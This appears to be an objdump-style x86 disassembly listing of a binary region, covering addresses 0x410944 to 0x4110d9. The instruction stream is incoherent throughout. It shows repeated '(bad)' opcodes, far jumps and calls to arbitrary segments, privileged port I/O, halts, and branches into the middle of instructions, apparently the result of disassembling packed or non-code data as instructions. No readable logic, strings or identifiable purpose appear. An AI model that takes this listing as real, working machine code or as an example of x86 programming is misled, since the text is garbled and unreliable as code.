  410944:	pop    ecx
  410945:	test   BYTE PTR [edx+ecx*8+0x53],dh
  410949:	push   ecx
  41094a:	push   0x31
  41094c:	rcr    bl,1
  41094e:	pop    ebp
  41094f:	cmp    dh,BYTE PTR [ebx]
  410951:	mov    ah,0xcb
  410953:	inc    esp
  410954:	xchg   ebx,eax
  410955:	mov    ebx,0x41be2697
  41095a:	retf   
  41095b:	and    BYTE PTR [edi-0x8737e27],bl
  410961:	add    al,BYTE PTR [ebp+0x57]
  410964:	jmp    0xbbc7:0xed35f189
  41096b:	xor    BYTE PTR [edi],bh
  41096d:	dec    DWORD PTR [ecx-0x5e]
  410970:	clc    
  410971:	mov    fs,WORD PTR [eax+ebx*2-0xb]
  410975:	fdivp  st(0),st
  410977:	loopne 0x4109b2
  410979:	jmp    0xd26e:0xad3653a4
  410980:	jle    0x410984
  410982:	test   al,0xda
  410984:	sahf   
  410985:	mov    bh,0x4a
  410987:	mov    edi,0x980552bb
  41098c:	cs loopne 0x4109b4
  41098f:	call   0x31fe:0x32f8a6e7
  410996:	cmp    esi,DWORD PTR [ecx+esi*1]
  410999:	dec    ebp
  41099a:	or     ch,BYTE PTR [eax+eax*8]
  41099d:	mov    WORD PTR [edx-0x5ee87f4],gs
  4109a3:	pop    DWORD PTR [edi-0x14]
  4109a6:	lds    esi,FWORD PTR [edx-0x67b112e9]
  4109ac:	jae    0x410968
  4109ae:	mov    BYTE PTR ds:0x55eeb752,bl
  4109b4:	xor    ah,BYTE PTR [ecx-0x5de3f88f]
  4109ba:	xchg   edi,eax
  4109bb:	lds    eax,FWORD PTR [ebx-0x48c63e67]
  4109c1:	adc    bl,BYTE PTR [eax+esi*1]
  4109c4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4109c5:	mov    ds:0x66bbb6ce,al
  4109ca:	clc    
  4109cb:	ficomp DWORD PTR [ecx+esi*4+0x7f]
  4109cf:	add    dl,BYTE PTR [eax+esi*2]
  4109d2:	mov    ebx,0xe72884c3
  4109d7:	hlt    
  4109d8:	mov    ds:0x5af2cafe,al
  4109dd:	je     0x4109d1
  4109df:	xor    al,0xf6
  4109e1:	data16 aaa 
  4109e3:	(bad)  
  4109e4:	jnp    0x41099d
  4109e6:	mov    bl,0x21
  4109e8:	rcl    edx,0x88
  4109eb:	mov    ebx,0x5a7e2809
  4109f0:	daa    
  4109f1:	div    edx
  4109f3:	or     al,BYTE PTR [eax+0x2d93a07]
  4109f9:	sub    BYTE PTR [ebp-0x28],al
  4109fc:	arpl   WORD PTR [eax-0x568a467f],bx
  410a02:	and    edi,eax
  410a04:	adc    eax,0xcee02007
  410a09:	sahf   
  410a0a:	(bad)  
  410a0b:	in     al,dx
  410a0c:	cwde   
  410a0d:	clc    
  410a0e:	jns    0x4109fe
  410a10:	mov    al,0xaf
  410a12:	jecxz  0x410997
  410a14:	cvtps2pd xmm6,xmm5
  410a17:	mov    ah,bh
  410a19:	cmp    ebx,DWORD PTR [ebp+0x34c756b8]
  410a1f:	lock adc DWORD PTR [ecx],ecx
  410a22:	js     0x410a4c
  410a24:	ds push esi
  410a26:	jo     0x410a84
  410a28:	mov    BYTE PTR [edx-0x62b22da5],ch
  410a2e:	mov    dl,0x60
  410a30:	xchg   eax,eax
  410a32:	mov    cl,0x2
  410a34:	fucomp st(2)
  410a36:	in     al,dx
  410a37:	dec    ebp
  410a38:	jb     0x410a70
  410a3a:	pop    ss
  410a3b:	push   edx
  410a3c:	add    DWORD PTR [edi],esp
  410a3e:	pushf  
  410a3f:	sahf   
  410a40:	stc    
  410a41:	and    eax,0x547bbf87
  410a46:	stc    
  410a47:	addr16 mov edx,0x33a1a732
  410a4d:	icebp  
  410a4e:	out    0x85,eax
  410a50:	les    edx,FWORD PTR [ecx-0x30]
  410a53:	cmp    BYTE PTR [esi],bl
  410a55:	cmp    DWORD PTR [ebp-0x71aba3fb],ecx
  410a5b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  410a5c:	xor    eax,ebx
  410a5e:	xchg   ecx,eax
  410a5f:	adc    esi,DWORD PTR [bp+di+0x3eaa]
  410a64:	jmp    0xe72f40a2
  410a69:	adc    esi,ebx
  410a6b:	add    BYTE PTR [esi],0x62
  410a6e:	stc    
  410a6f:	xor    edx,edx
  410a71:	ds dec eax
  410a73:	sub    bl,BYTE PTR [ebx+0x3e]
  410a76:	mov    ah,0x37
  410a78:	mov    edi,0x43496f6e
  410a7d:	inc    ecx
  410a7e:	mov    cl,0x9d
  410a80:	mov    edx,0x846e8c18
  410a85:	add    BYTE PTR [esi],ah
  410a87:	mov    bh,BYTE PTR [ebx]
  410a89:	xor    DWORD PTR [ecx-0x16],edi
  410a8c:	or     DWORD PTR [ecx+0x36],edx
  410a8f:	sub    eax,0x29697a17
  410a94:	cld    
  410a95:	cmp    DWORD PTR [ecx+0x2d],esi
  410a98:	daa    
  410a99:	por    mm2,QWORD PTR [eax-0x65]
  410a9d:	in     al,0x3e
  410a9f:	dec    ebx
  410aa0:	jno    0x410b1b
  410aa2:	push   esp
  410aa3:	or     esi,eax
  410aa5:	xchg   edx,eax
  410aa6:	jo     0x410aba
  410aa8:	stc    
  410aa9:	dec    ecx
  410aaa:	mov    dh,0xad
  410aac:	cmp    eax,0xc6c4df68
  410ab1:	xlat   BYTE PTR ds:[ebx]
  410ab2:	mov    dl,0x2a
  410ab4:	and    edx,DWORD PTR [ebx-0x19]
  410ab7:	pop    eax
  410ab8:	dec    ebx
  410ab9:	div    DWORD PTR ds:0x65bf8348
  410abf:	mov    al,0xf8
  410ac1:	rcl    DWORD PTR [edi],0x60
  410ac4:	and    eax,0x68800b80
  410ac9:	and    DWORD PTR [ecx],ecx
  410acb:	or     al,0x9
  410acd:	xchg   edx,eax
  410ace:	or     bh,ah
  410ad0:	pushf  
  410ad1:	jecxz  0x410b25
  410ad3:	out    0x10,al
  410ad5:	inc    edi
  410ad6:	inc    ecx
  410ad7:	lods   eax,DWORD PTR ds:[esi]
  410ad8:	pop    es
  410ad9:	mov    fs:0x841775a8,eax
  410adf:	and    esi,ebp
  410ae1:	stos   DWORD PTR es:[edi],eax
  410ae2:	jnp    0x410ab4
  410ae4:	dec    edi
  410ae5:	dec    ebx
  410ae6:	fadd   DWORD PTR [esi]
  410ae8:	sub    edx,DWORD PTR [ebx-0x5a]
  410aeb:	shl    BYTE PTR ds:0xf3f85c32,cl
  410af1:	ds add esi,edi
  410af4:	inc    edi
  410af5:	ins    DWORD PTR es:[edi],dx
  410af6:	sbb    eax,0x5003d6ce
  410afb:	call   0x61c9:0x3dc06b42
  410b02:	add    esi,ecx
  410b04:	mov    al,BYTE PTR [ecx-0x2c2f9e50]
  410b0a:	add    bl,BYTE PTR [ebx+0x4cd8071e]
  410b10:	push   0xb61c0a35
  410b15:	mov    al,ds:0x57e0c6e0
  410b1a:	push   esi
  410b1b:	dec    ecx
  410b1c:	aas    
  410b1d:	push   ebx
  410b1e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  410b1f:	mov    dl,al
  410b21:	jl     0x410ad1
  410b23:	jnp    0x410b14
  410b25:	sti    
  410b26:	cdq    
  410b27:	repz and eax,0x5c3370a
  410b2d:	pop    ds
  410b2e:	ins    DWORD PTR es:[edi],dx
  410b2f:	lods   al,BYTE PTR ds:[esi]
  410b30:	jnp    0x410ba8
  410b32:	cli    
  410b33:	xor    dl,BYTE PTR [ebx+eax*2]
  410b36:	xchg   edx,eax
  410b37:	sub    dl,cl
  410b39:	lahf   
  410b3a:	adc    edx,DWORD PTR [ebx-0x7b]
  410b3d:	fwait
  410b3e:	jbe    0x410b48
  410b40:	ins    BYTE PTR es:[edi],dx
  410b41:	(bad)  
  410b42:	(bad)  
  410b43:	jb     0x410b6b
  410b45:	(bad)  
  410b46:	jmp    0x89c9:0xa12130a
  410b4d:	xor    bh,BYTE PTR [ecx]
  410b4f:	arpl   WORD PTR [eax+0xf3acf6b],di
  410b55:	mov    bl,0x1e
  410b57:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  410b58:	add    BYTE PTR [ecx-0x2],bh
  410b5b:	(bad)  
  410b5d:	push   cs
  410b5e:	cmp    eax,0x79f49819
  410b63:	add    edi,0xf420eec6
  410b69:	outs   dx,DWORD PTR ds:[esi]
  410b6a:	pop    edx
  410b6b:	xchg   edi,eax
  410b6c:	lods   eax,DWORD PTR ds:[esi]
  410b6d:	dec    esp
  410b6e:	pop    esi
  410b6f:	mov    dh,0xd
  410b71:	dec    esp
  410b72:	push   0xffffffb9
  410b74:	push   ss
  410b75:	in     al,dx
  410b76:	bound  edi,QWORD PTR [edx]
  410b78:	sbb    DWORD PTR [esi+0x50],eax
  410b7b:	pop    ebx
  410b7c:	jnp    0x410b8b
  410b7e:	dec    esi
  410b7f:	(bad)  [edx-0x5cff7651]
  410b85:	(bad)  
  410b86:	cwde   
  410b87:	in     eax,0x4d
  410b89:	sbb    eax,0x1df7ff06
  410b8e:	inc    ebp
  410b8f:	sbb    BYTE PTR [esi-0xea72d6],bl
  410b95:	jp     0x410baf
  410b97:	pop    es
  410b98:	xchg   ecx,esi
  410b9a:	ficom  DWORD PTR [esi+ecx*8]
  410b9d:	es dec ebp
  410b9f:	in     al,0x81
  410ba1:	loope  0x410b49
  410ba3:	push   ss
  410ba4:	outs   dx,DWORD PTR ss:[esi]
  410ba6:	jo     0x410bf3
  410ba8:	pushf  
  410ba9:	and    dl,BYTE PTR [edx]
  410bab:	cmp    BYTE PTR [eax],dl
  410bad:	inc    edx
  410bae:	pop    ss
  410baf:	outs   dx,BYTE PTR ds:[esi]
  410bb0:	xchg   ebp,eax
  410bb1:	out    0x92,al
  410bb3:	pop    esp
  410bb4:	jmp    0x574edbad
  410bb9:	enter  0x7f73,0x18
  410bbd:	or     bh,BYTE PTR fs:[ecx+0x27626e2b]
  410bc4:	icebp  
  410bc5:	xchg   ebp,eax
  410bc6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  410bc7:	add    DWORD PTR ds:0x5182b582,0x82640aac
  410bd1:	jle    0x410ba6
  410bd3:	push   ds
  410bd4:	dec    esi
  410bd5:	lahf   
  410bd6:	call   0x41b20128
  410bdb:	ss push ebx
  410bdd:	push   eax
  410bde:	push   0x66d9aaeb
  410be3:	sti    
  410be4:	out    0xe7,al
  410be6:	or     ebx,DWORD PTR [ecx+edi*4+0x6e26e038]
  410bed:	dec    edx
  410bee:	ja     0x410c23
  410bf0:	mov    al,0x90
  410bf2:	dec    esi
  410bf3:	sti    
  410bf4:	mov    eax,esp
  410bf6:	daa    
  410bf7:	pusha  
  410bf8:	pushf  
  410bf9:	test   BYTE PTR [esi],bl
  410bfb:	(bad)  
  410bfc:	push   esp
  410bfd:	in     al,dx
  410bfe:	fs scas al,BYTE PTR es:[edi]
  410c00:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  410c01:	add    eax,0x54c0df9c
  410c06:	mov    WORD PTR [ebx-0x666ef29d],?
  410c0c:	and    eax,0x5cee67f4
  410c11:	pop    ss
  410c12:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  410c13:	vxorps ymm7,ymm1,YMMWORD PTR [esi-0x1f]
  410c18:	pop    es
  410c19:	or     al,0x3f
  410c1b:	xchg   DWORD PTR [esi],ebx
  410c1d:	and    al,0x23
  410c1f:	jp     0x410ba1
  410c21:	jnp    0x410bd0
  410c23:	fimul  WORD PTR [edi]
  410c25:	ror    DWORD PTR [esi],1
  410c27:	ret    
  410c28:	gs mov al,0xd3
  410c2b:	mov    esp,0xc1879b30
  410c30:	popf   
  410c31:	pop    ebp
  410c32:	inc    esp
  410c33:	jne    0x410bf5
  410c35:	stc    
  410c36:	data16 mov WORD PTR [esi+0x63],ss
  410c3a:	shr    bl,1
  410c3c:	inc    edi
  410c3d:	popa   
  410c3e:	or     dl,BYTE PTR ss:[edx]
  410c41:	sbb    eax,0x81fc7fa1
  410c46:	dec    esi
  410c47:	out    dx,eax
  410c48:	xor    BYTE PTR [ebx+0x8],bl
  410c4b:	mov    edi,0x56a1e465
  410c50:	rcr    DWORD PTR [esi+0x3b941d67],1
  410c56:	daa    
  410c57:	inc    ebp
  410c58:	std    
  410c59:	aad    0x5a
  410c5b:	mov    WORD PTR [edx+0x36ed61d1],ss
  410c61:	sub    ch,BYTE PTR [eax]
  410c63:	out    dx,al
  410c64:	jns    0x410c80
  410c66:	fstp   TBYTE PTR [ebx+0x45ee31da]
  410c6c:	add    eax,0x62c5d47f
  410c71:	fdivr  DWORD PTR [edx]
  410c73:	jbe    0x410c98
  410c75:	icebp  
  410c76:	aad    0xc0
  410c78:	inc    ecx
  410c79:	ins    BYTE PTR es:[edi],dx
  410c7a:	lahf   
  410c7b:	mov    esi,0x4417a218
  410c80:	cmp    ebp,DWORD PTR [ebx+0x3d843412]
  410c86:	dec    ebx
  410c87:	mov    ds:0x1421dc68,al
  410c8c:	add    ah,bl
  410c8e:	dec    ebp
  410c8f:	daa    
  410c90:	mov    bl,0x97
  410c92:	xchg   al,ah
  410c94:	jg     0x410c79
  410c96:	cwde   
  410c97:	scas   al,BYTE PTR es:[edi]
  410c98:	popf   
  410c99:	int    0x3d
  410c9b:	jne    0x410cda
  410c9d:	mov    cl,0x12
  410c9f:	push   ebp
  410ca0:	cmp    BYTE PTR [edx],0x2e
  410ca3:	fstp   QWORD PTR [ebx]
  410ca5:	lea    esi,[esi+0x2be48786]
  410cab:	bound  ebp,QWORD PTR [edx+edi*4]
  410cae:	shl    DWORD PTR [ebx],0xf3
  410cb1:	xor    al,0xcb
  410cb3:	and    DWORD PTR [esi+0x16ac52fa],0x33e92f9d
  410cbd:	outs   dx,DWORD PTR ds:[esi]
  410cbe:	shl    BYTE PTR [ebp-0x55def733],cl
  410cc4:	scas   al,BYTE PTR es:[edi]
  410cc5:	loop   0x410d29
  410cc7:	push   cs
  410cc8:	dec    eax
  410cc9:	pop    ds
  410cca:	jmp    0x36b4816d
  410ccf:	xor    al,0xa3
  410cd1:	jge    0x410c8c
  410cd3:	clc    
  410cd4:	mov    edx,0xf804b723
  410cd9:	xor    dh,BYTE PTR [ecx+edi*1+0x29]
  410cdd:	pop    esi
  410cde:	enter  0x4dd6,0xa7
  410ce2:	xor    edx,edx
  410ce4:	in     eax,0xf4
  410ce6:	das    
  410ce7:	retf   
  410ce8:	adc    esi,eax
  410cea:	push   ecx
  410ceb:	push   ecx
  410cec:	pop    esi
  410ced:	cmp    al,0x44
  410cef:	xchg   ecx,eax
  410cf0:	cld    
  410cf1:	inc    ecx
  410cf2:	fcom   QWORD PTR [ebp+0x4f]
  410cf5:	rcr    DWORD PTR [ebx-0x61],1
  410cf8:	and    esp,DWORD PTR [edx+0x71]
  410cfb:	push   cs
  410cfc:	pop    eax
  410cfd:	jnp    0x410d1f
  410cff:	pusha  
  410d00:	test   eax,0xf86448a4
  410d05:	xchg   edx,eax
  410d06:	mov    ds:0xb44c60f9,eax
  410d0b:	call   0x3188:0x7e439040
  410d12:	test   al,0x13
  410d14:	pop    eax
  410d15:	inc    edi
  410d16:	(bad)  
  410d17:	push   ebx
  410d18:	shl    dl,1
  410d1a:	inc    ebx
  410d1b:	mov    DWORD PTR [edi],0x9ee4f233
  410d21:	pop    ss
  410d22:	mov    ebp,0x6aee953c
  410d27:	push   edi
  410d28:	push   esp
  410d29:	sahf   
  410d2a:	test   al,0xd0
  410d2c:	sbb    ah,ah
  410d2e:	xchg   ecx,eax
  410d2f:	and    ch,ah
  410d31:	imul   edi,DWORD PTR [ecx-0x64812772],0x71898ecc
  410d3b:	and    dh,ah
  410d3d:	ja     0x410d20
  410d3f:	cmp    al,BYTE PTR [ecx-0x82a916]
  410d45:	leave  
  410d46:	jle    0x410d54
  410d48:	mov    esp,0x997f4c1
  410d4d:	cmp    DWORD PTR [eax+eax*8],esi
  410d50:	outs   dx,BYTE PTR ds:[esi]
  410d51:	loope  0x410d4e
  410d53:	jge    0x410d4a
  410d55:	scas   eax,DWORD PTR es:[edi]
  410d56:	repnz out dx,al
  410d58:	dec    ebx
  410d59:	or     al,BYTE PTR [ebx-0x11ae6275]
  410d5f:	jb     0x410db2
  410d61:	lods   al,BYTE PTR ds:[esi]
  410d62:	mov    bl,0xf2
  410d64:	pop    edi
  410d65:	push   ebx
  410d66:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  410d67:	sbb    esp,DWORD PTR [ebx-0x7]
  410d6a:	sub    bh,BYTE PTR [eax]
  410d6c:	or     BYTE PTR [ebp+0x285b4bd1],al
  410d72:	mul    DWORD PTR [edi-0x22069250]
  410d78:	sbb    DWORD PTR [edi],edx
  410d7a:	lahf   
  410d7b:	stc    
  410d7c:	loopne 0x410d09
  410d7e:	mov    edx,0x454c7a47
  410d83:	pop    esi
  410d84:	mov    ds:0xbc6cc7a7,al
  410d89:	arpl   WORD PTR [ebx-0x7e47196b],bp
  410d8f:	dec    edi
  410d90:	inc    ebx
  410d91:	jmp    0x410d1a
  410d93:	add    al,0x74
  410d95:	es mov dh,0x38
  410d98:	and    al,0x77
  410d9a:	js     0x410d3d
  410d9c:	rol    BYTE PTR [edi+eax*2],cl
  410d9f:	in     eax,dx
  410da0:	hlt    
  410da1:	out    dx,eax
  410da2:	jb     0x410e12
  410da4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  410da5:	popa   
  410da6:	js     0x410d60
  410da8:	inc    esp
  410da9:	loopne 0x410dfe
  410dab:	and    DWORD PTR [ecx-0x77],ebx
  410dae:	jle    0x410e06
  410db0:	jae    0x410dba
  410db2:	iret   
  410db3:	jge    0x410d88
  410db5:	dec    edi
  410db6:	(bad)  
  410db8:	sbb    DWORD PTR [ecx],esi
  410dba:	inc    esi
  410dbb:	cmp    cl,dh
  410dbd:	xchg   esp,eax
  410dbe:	data16 mov cl,BYTE PTR [ebp+0x18023b28]
  410dc5:	loope  0x410db7
  410dc7:	out    dx,eax
  410dc8:	sbb    al,0x44
  410dca:	popf   
  410dcb:	ror    DWORD PTR [eax],0xe5
  410dce:	neg    cl
  410dd0:	inc    esp
  410dd1:	push   ecx
  410dd2:	nop
  410dd3:	inc    esi
  410dd4:	mov    ch,0xe9
  410dd6:	push   0xe856a88f
  410ddb:	cmc    
  410ddc:	push   cs
  410ddd:	sbb    bh,bl
  410ddf:	shl    DWORD PTR [edx+0x5290cda8],cl
  410de5:	and    al,BYTE PTR [ebp+0x39743ad]
  410deb:	popa   
  410dec:	cmp    eax,0x9cdaadfa
  410df1:	dec    ebx
  410df2:	int    0x97
  410df4:	rol    BYTE PTR [ecx+ecx*4-0x483dad1d],0xf
  410dfc:	mov    ch,0x21
  410dfe:	inc    ebp
  410dff:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  410e00:	push   ecx
  410e01:	inc    esi
  410e02:	inc    esi
  410e03:	cmp    ebx,DWORD PTR [ebx+0x3b2573]
  410e09:	retf   
  410e0a:	out    0x9e,eax
  410e0c:	push   edx
  410e0d:	pop    ss
  410e0e:	dec    ebx
  410e0f:	shl    BYTE PTR [edi+0x36],0x1b
  410e13:	or     edx,ecx
  410e15:	inc    esi
  410e16:	outs   dx,BYTE PTR ds:[esi]
  410e17:	dec    edx
  410e18:	xchg   DWORD PTR [ebp-0x30],eax
  410e1b:	jl     0x410e5a
  410e1d:	inc    ebp
  410e1e:	inc    eax
  410e1f:	jno    0x410e7f
  410e21:	push   esi
  410e22:	xor    BYTE PTR ds:0x7b1ec9f9,cl
  410e28:	xchg   DWORD PTR [esi],edi
  410e2a:	lods   al,BYTE PTR ds:[esi]
  410e2b:	or     BYTE PTR [ebp+0x77],bl
  410e2e:	and    BYTE PTR [ebp+0x27],0xbc
  410e32:	scas   eax,DWORD PTR es:[edi]
  410e33:	aam    0xce
  410e35:	xchg   edx,eax
  410e36:	pop    edx
  410e37:	jb     0x410eae
  410e39:	das    
  410e3a:	mov    dl,0xd1
  410e3c:	iret   
  410e3d:	fwait
  410e3e:	sub    esp,DWORD PTR [ebx+0x53cbac3f]
  410e44:	pop    edi
  410e45:	fldenv [esi+ebp*1]
  410e48:	push   ds
  410e49:	loope  0x410e63
  410e4b:	in     eax,dx
  410e4c:	push   es
  410e4d:	(bad)  
  410e4e:	repnz inc edi
  410e50:	xor    esi,edi
  410e52:	and    DWORD PTR [ecx+0x2f13aed1],esi
  410e58:	sti    
  410e59:	jl     0x410e2c
  410e5b:	mov    ch,0xa6
  410e5d:	icebp  
  410e5e:	cmp    dl,BYTE PTR [ebx-0xa]
  410e61:	in     eax,0x30
  410e63:	cmp    ebp,DWORD PTR [ecx+0x485f605]
  410e69:	ins    DWORD PTR es:[edi],dx
  410e6a:	or     al,0x30
  410e6c:	push   ebp
  410e6d:	dec    esp
  410e6e:	push   ebx
  410e6f:	jns    0x410e83
  410e71:	add    ebx,edx
  410e73:	fwait
  410e74:	int    0x16
  410e76:	call   0x9fa34100
  410e7b:	lock and eax,0xcd47ae6b
  410e81:	push   edx
  410e82:	daa    
  410e83:	push   0x87b8916e
  410e88:	xor    DWORD PTR [edi],0x87004c18
  410e8e:	pushf  
  410e8f:	mov    esp,0xf5254865
  410e94:	sub    DWORD PTR [edx-0x71],edx
  410e97:	fisub  DWORD PTR [ecx+0x70a6da56]
  410e9d:	pop    edx
  410e9e:	rol    DWORD PTR [edi],0x25
  410ea1:	stos   DWORD PTR es:[edi],eax
  410ea2:	mov    DWORD PTR [ebp+0x57],esp
  410ea5:	retf   0x3884
  410ea8:	add    eax,0xf0c4f928
  410ead:	pop    ebx
  410eae:	cwde   
  410eaf:	inc    edx
  410eb0:	mov    WORD PTR [ebp+0x9],es
  410eb3:	dec    esi
  410eb4:	mov    ebx,0x7e406cc1
  410eb9:	inc    edi
  410eba:	ds add al,0xa9
  410ebd:	stos   DWORD PTR es:[edi],eax
  410ebe:	pop    ss
  410ebf:	or     BYTE PTR ds:0x94ea8ca9,0xdc
  410ec6:	ins    BYTE PTR es:[edi],dx
  410ec7:	push   eax
  410ec8:	das    
  410ec9:	sub    esi,0xf7219891
  410ecf:	xor    esp,ecx
  410ed1:	pop    ds
  410ed2:	jo     0x410e6e
  410ed4:	xchg   dl,dl
  410ed6:	dec    edi
  410ed7:	pop    ebp
  410ed8:	in     al,dx
  410ed9:	mov    al,0xd6
  410edb:	imul   esp,DWORD PTR [ebx-0x7b],0xffffffc4
  410edf:	aas    
  410ee0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  410ee1:	icebp  
  410ee2:	and    ecx,edx
  410ee4:	push   es
  410ee5:	add    DWORD PTR ds:0x34440329,ecx
  410eeb:	cmp    DWORD PTR [eax-0x3e],ebp
  410eee:	loop   0x410ea9
  410ef0:	fs jne 0x410ecc
  410ef3:	xor    eax,0x1ae0220d
  410ef8:	xchg   edi,eax
  410ef9:	(bad)  
  410efa:	bnd je 0x410ee8
  410efd:	ins    DWORD PTR es:[edi],dx
  410efe:	push   edi
  410eff:	out    0xcc,al
  410f01:	outs   dx,DWORD PTR ds:[esi]
  410f02:	mov    esi,0xf667a985
  410f07:	cmp    BYTE PTR [edx+0x705c8dca],dl
  410f0d:	leave  
  410f0e:	and    al,0x21
  410f10:	(bad)  
  410f11:	mov    ch,0xe0
  410f13:	jae    0x410f13
  410f15:	mov    bh,0x12
  410f17:	jmp    0x410f7e
  410f19:	out    0xf,al
  410f1b:	xor    esi,ecx
  410f1d:	mov    eax,0x45e9fb55
  410f22:	(bad)  
  410f23:	sbb    al,0x28
  410f25:	add    edx,ecx
  410f27:	push   edi
  410f28:	mov    cl,0x1a
  410f2a:	shl    BYTE PTR [eax+0x78],cl
  410f2d:	mov    ds:0xe0fc9bf0,eax
  410f32:	int3   
  410f33:	call   0xbef02392
  410f38:	enter  0xb89c,0x6b
  410f3c:	loopne 0x410f8b
  410f3e:	pushf  
  410f3f:	xor    BYTE PTR fs:[esi+0x4e69bb5e],cl
  410f46:	mov    ebx,0x8006618b
  410f4b:	scas   al,BYTE PTR es:[edi]
  410f4c:	call   0xc6e1a8f4
  410f51:	dec    edi
  410f52:	call   0x72870b5b
  410f57:	mov    cl,0x58
  410f59:	inc    esi
  410f5a:	rcr    ah,cl
  410f5c:	xchg   BYTE PTR [edi-0x7a],dh
  410f5f:	xor    eax,0x215ee84b
  410f64:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  410f65:	jl     0x410fb3
  410f67:	mov    ds:0x91281f37,eax
  410f6c:	add    al,0xf
  410f6e:	ror    BYTE PTR [edx+0x2f74a77f],1
  410f74:	and    eax,0x99a976d6
  410f79:	mov    ds:0x8235522f,eax
  410f7e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  410f7f:	aaa    
  410f80:	xchg   edi,eax
  410f81:	jecxz  0x410fec
  410f83:	ins    DWORD PTR es:[edi],dx
  410f84:	je     0x410f24
  410f86:	shl    bh,1
  410f88:	not    BYTE PTR [ecx]
  410f8a:	sti    
  410f8b:	xchg   esp,eax
  410f8c:	(bad)  
  410f8e:	cmp    al,0x2e
  410f90:	ficom  DWORD PTR [edi-0x2c49cd62]
  410f96:	sub    esp,esp
  410f98:	jo     0x410f98
  410f9a:	ret    0x317
  410f9d:	ss add eax,0xc00e6a53
  410fa3:	mov    ecx,0x2a1e1e52
  410fa8:	popf   
  410fa9:	cwde   
  410faa:	loop   0x410f48
  410fac:	cmp    BYTE PTR [ecx-0x24],0x8a
  410fb0:	or     cl,BYTE PTR [edi+0x24]
  410fb3:	mov    ?,WORD PTR [ebx+0x3888f8ac]
  410fb9:	jl     0x410ff6
  410fbb:	sbb    cl,ah
  410fbd:	fwait
  410fbe:	jno    0x410fc5
  410fc0:	jge    0x41102e
  410fc2:	(bad)  
  410fc3:	cli    
  410fc4:	test   DWORD PTR ds:0x52d3243,eax
  410fca:	(bad)  
  410fcb:	sub    eax,0x47648adb
  410fd0:	cvtps2pd xmm0,QWORD PTR [esi+0x6daab9ff]
  410fd7:	cmc    
  410fd8:	push   0x5cc0518e
  410fdd:	mul    DWORD PTR [edx+0x17745b6c]
  410fe3:	dec    eax
  410fe4:	fwait
  410fe5:	add    BYTE PTR [ecx+ebp*1+0x7422d2],0x29
  410fed:	cdq    
  410fee:	dec    ecx
  410fef:	add    eax,0xca308071
  410ff4:	mov    edi,0xb9befc8b
  410ff9:	cmp    bl,al
  410ffb:	push   es
  410ffc:	push   cs
  410ffd:	jbe    0x410fa6
  410fff:	or     al,0x6f
  411001:	test   DWORD PTR ds:0x22a044ad,edi
  411007:	and    eax,0x8ac014ce
  41100c:	retf   0x355
  41100f:	dec    ebx
  411010:	loope  0x411021
  411012:	mov    ebp,0x18780171
  411017:	(bad)  
  411018:	cmp    dl,dl
  41101a:	popa   
  41101b:	sbb    BYTE PTR [ebx+0x27],ch
  41101e:	jo     0x411029
  411020:	push   ss
  411021:	cmc    
  411022:	not    BYTE PTR [esi+0x15]
  411025:	mov    edx,0x49a67bf8
  41102a:	sub    DWORD PTR [esi+0x3673871],ebp
  411030:	je     0x41100c
  411032:	aam    0x49
  411034:	push   ds
  411035:	lahf   
  411036:	in     eax,dx
  411037:	std    
  411038:	int    0xbd
  41103a:	(bad)  
  41103b:	fs out 0x42,al
  41103e:	jg     0x410fd2
  411040:	mov    DWORD PTR [esi],ebx
  411042:	adc    DWORD PTR [ecx+eax*4+0x30],eax
  411046:	and    al,0x7
  411048:	scas   eax,DWORD PTR es:[edi]
  411049:	fstp   DWORD PTR [edi+0x6f]
  41104c:	pop    ecx
  41104d:	xchg   esp,eax
  41104e:	jmp    0xfab8:0xc82bd3a9
  411055:	pushf  
  411056:	xor    ah,BYTE PTR [ecx+0x2b]
  411059:	mov    ds:0xad4365d9,al
  41105e:	loop   0x4110d0
  411060:	rcr    BYTE PTR [edx-0x56],0x45
  411064:	sub    esi,DWORD PTR [ebx]
  411066:	hlt    
  411067:	xor    ah,dh
  411069:	shl    DWORD PTR [eax+esi*8-0x12],0xf7
  41106e:	jnp    0x4110af
  411070:	fld    QWORD PTR [esi-0x58]
  411073:	sbb    esp,DWORD PTR [edi-0x2bdaeb6c]
  411079:	adc    DWORD PTR [edi-0x6e],0x15f5b0bc
  411080:	in     al,dx
  411081:	call   0x301b:0xb9be5d2d
  411088:	popf   
  411089:	leave  
  41108a:	fidiv  DWORD PTR [eax]
  41108c:	push   ds
  41108d:	popa   
  41108e:	mov    WORD PTR [ebx],fs
  411090:	sbb    DWORD PTR [esi],edi
  411092:	lods   eax,DWORD PTR ds:[esi]
  411093:	cld    
  411094:	cmovg  edx,DWORD PTR [edi]
  411097:	rol    DWORD PTR [ebx],1
  411099:	lods   eax,DWORD PTR ds:[esi]
  41109a:	push   es
  41109b:	mov    ebx,0x92b6d061
  4110a0:	popa   
  4110a1:	xor    cl,ah
  4110a3:	loope  0x4110e9
  4110a5:	push   edi
  4110a6:	ret    0xaaf4
  4110a9:	ret    0x6c63
  4110ac:	xor    BYTE PTR [ebx+0x8],dh
  4110af:	cmp    DWORD PTR [ebp+0x35e0c40a],ecx
  4110b5:	xor    DWORD PTR [esi+0x2f],edx
  4110b8:	inc    edi
  4110b9:	sub    esp,0xc5bdc01e
  4110bf:	(bad)  
  4110c0:	jns    0x41112d
  4110c2:	and    ebp,DWORD PTR [edi]
  4110c4:	stc    
  4110c5:	inc    eax
  4110c6:	mov    ds:0x47e17efd,al
  4110cb:	push   ecx
  4110cc:	cld    
  4110cd:	dec    ebx
  4110ce:	push   ebp
  4110cf:	ins    BYTE PTR es:[edi],dx
  4110d0:	clc    
  4110d1:	outs   dx,DWORD PTR ds:[esi]
  4110d2:	cwde   
  4110d3:	push   ss
  4110d4:	adc    eax,0x6f17bea
  4110d9:	xchg   edx,eax
